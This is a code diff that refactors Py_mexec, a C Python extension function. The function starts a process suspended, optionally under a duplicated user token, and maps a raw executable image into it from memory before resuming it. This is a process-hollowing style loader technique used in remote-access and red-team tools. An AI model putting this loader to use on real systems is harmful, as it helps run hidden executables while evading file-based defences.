@@ -91,7 +91,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         PyObject* py_redirect_stdio = NULL;
         PyObject* py_hidden = NULL;
         DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;
-        char *cmd_line;
+        PyObject* py_cmdline = NULL;
         char *pe_raw_bytes;
         int pe_raw_bytes_len;
 
@@ -102,8 +102,8 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
 
         if (!PyArg_ParseTuple(
                         args,
-                        "ss#|OOK",
-                        &cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
+                        "Os#|OOK",
+                        &py_cmdline, &pe_raw_bytes, &pe_raw_bytes_len,
                         &py_redirect_stdio, &py_hidden, &dupHandleAddressPLL))
                 // the address of the handle is directly passed with ctypes
                 return NULL;
@@ -115,12 +115,18 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
 
         if (!PyArg_ParseTuple(
                         args,
-                        "ss#|OOI",
-                        &cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
+                        "Os#|OOI",
+                        &py_cmdline, &pe_raw_bytes, &pe_raw_bytes_len,
                         &py_redirect_stdio, &py_hidden, &dupHandleAddress))
                 // the address of the handle is directly passed with ctypes
                 return NULL;
 #endif
+
+        if (!(PyUnicode_Check(py_cmdline) || PyString_Check(py_cmdline))) {
+                return PyErr_Format(
+                        PyExc_Exception, "cmdline must be either str or unicode"
+                );
+        }
 
         memset(&si,0,sizeof(STARTUPINFO));
         memset(&pi,0,sizeof(PROCESS_INFORMATION));
@@ -151,17 +157,69 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         }
 
         if (!dupHandleAddress) {
-                if(!CreateProcess(NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+                BOOL blCreated;
+                if (PyUnicode_Check(py_cmdline)) {
+                        size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
+                        size_t size = wsize * sizeof(wchar_t);
+
+                        wchar_t *tmpstr = malloc(size);
+                        RtlZeroMemory(tmpstr, size);
+
+                        dprint("Py_mexec::unicode cmdline, size=%d\n", wsize);
+
+                        PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
+                        blCreated = CreateProcessW(
+                                NULL, tmpstr,
+                                &saAttr, NULL, inherit,
+                                createFlags, NULL, NULL, &si, &pi
+                        );
+                        free(tmpstr);
+                } else {
+                        dprint("Py_mexec::char cmdline\n");
+
+                        blCreated = CreateProcessA(
+                                NULL, PyString_AsString(py_cmdline),
+                                &saAttr, NULL, inherit,
+                                createFlags, NULL, NULL, &si, &pi
+                        );
+                }
+
+                if(!blCreated) {
                         CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                         CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
 
-                        return PyErr_Format(PyExc_Exception, "Error in CreateProcess: Errno %d", GetLastError());
+                        return PyErr_Format(
+                                PyExc_Exception, "Error in CreateProcess: Errno %d",
+                                GetLastError()
+                        );
                 }
 
         } else {
+                BOOL blCreated;
                 dupHandle=(HANDLE) dupHandleAddress;
-                if (!CreateProcessAsUser(dupHandle, NULL, cmd_line, &saAttr,
-                                                                 NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+
+                if (PyUnicode_Check(py_cmdline)) {
+                        size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
+                        size_t size = wsize * sizeof(wchar_t);
+
+                        wchar_t *tmpstr = malloc(size);
+
+                        RtlZeroMemory(tmpstr, size);
+
+                        PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
+                        blCreated = CreateProcessAsUserW(
+                                dupHandle, NULL, tmpstr, &saAttr,
+                                NULL, inherit, createFlags, NULL, NULL, &si, &pi
+                        );
+                        free(tmpstr);
+                } else {
+                        blCreated = CreateProcessAsUserA(
+                                dupHandle, NULL, PyString_AsString(py_cmdline), &saAttr,
+                                NULL, inherit, createFlags, NULL, NULL, &si, &pi
+                        );
+                }
+
+                if (!blCreated) {
                         CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                         CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
 
@@ -176,11 +234,17 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
         CloseHandle(g_hChildStd_OUT_Wr);
 
         if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
+                DWORD dwErrno = GetLastError();
+
                 TerminateProcess(pi.hProcess, 1);
                 CloseHandle(pi.hProcess);
                 CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                 CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
-                return PyErr_Format(PyExc_Exception, "Error in MapNewExecutableRegionInProcess: Errno %d", GetLastError());
+                return PyErr_Format(
+                        PyExc_Exception,
+                        "Error in MapNewExecutableRegionInProcess: Errno %d",
+                        dwErrno
+                );
         }
 
         if (ResumeThread(pi.hThread) == (DWORD)-1) {
@@ -188,7 +252,10 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                 CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
-                return PyErr_Format(PyExc_Exception, "Error in ResumeThread: Errno %d", GetLastError());
+                return PyErr_Format(
+                        PyExc_Exception,
+                        "Error in ResumeThread: Errno %d", GetLastError()
+                );
         }
 
         CloseHandle(pi.hThread);
